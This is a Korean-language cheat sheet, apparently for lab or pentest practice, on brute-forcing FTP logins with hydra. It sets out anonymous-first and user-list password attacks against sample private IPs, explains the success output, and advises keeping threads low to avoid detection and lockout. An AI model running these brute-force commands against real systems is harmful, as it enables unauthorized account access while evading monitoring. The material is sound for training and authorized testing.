# hydra — FTP

- FTP(21/tcp, 비표준 포트 포함) 서비스에 대한 온라인 패스워드 브루트포스 — `-l/-L`·`-P`로 계정·패스워드 리스트를 넣고 ftp 모듈로 대상에 직접 인증 시도
- FTP 포트 접근 가능, hydra 설치(Kali 기본), 워드리스트(rockyou.txt·SecLists) — -t 과다 시 탐지·계정 잠금 위험, Anonymous 계정부터 시도 권장
- 공통 옵션(-l/-L/-p/-P/-s/-t/-f/-V 등)과 전체 절차는 `hydra-structured.md`, `hydra_practice.md` 참고

## 기본형

```bash
# Anonymous 계정부터 시도
hydra -l anonymous -P passwords.txt ftp://10.10.10.10 -V

# 일반 사용자 계정
hydra -l ftpuser -P passwords.txt ftp://10.10.10.10
hydra -l ftpuser -P passwords.txt ftp://10.10.11.68 -s 21

# 사용자명 리스트 + 패스워드 리스트
hydra -L users.txt -P passwords.txt ftp://10.10.10.10 -t 8
```

## 단계별 시도

```bash
# 1단계: Anonymous 계정 시도
hydra -l anonymous -P passwords.txt ftp://10.10.11.68 -V

# 2단계: 실패 시 일반 사용자 계정으로
hydra -L users.txt -P passwords.txt ftp://10.10.11.68 -t 8
```

## 실전 예시

```bash
hydra -l anonymous -P pass.txt ftp://10.10.10.10
hydra -l anonymous -P passwords.txt ftp://10.10.11.68 -V
hydra -L users.txt -P passwords.txt ftp://10.10.10.10
```

## 결과 해석

```
[21][ftp] host: 10.10.10.10 login: ftpuser password: ftppass
```

- `[포트][ftp]`: 서비스 정보
- `host`: 대상 IP
- `login`: 유효한 사용자명
- `password`: 유효한 비밀번호

## 주의

- `-t`는 4~8 권장. 과다 시 탐지·계정 잠금
- 비표준 포트는 `-s` 병기
- Anonymous 접근이 허용되는지 먼저 확인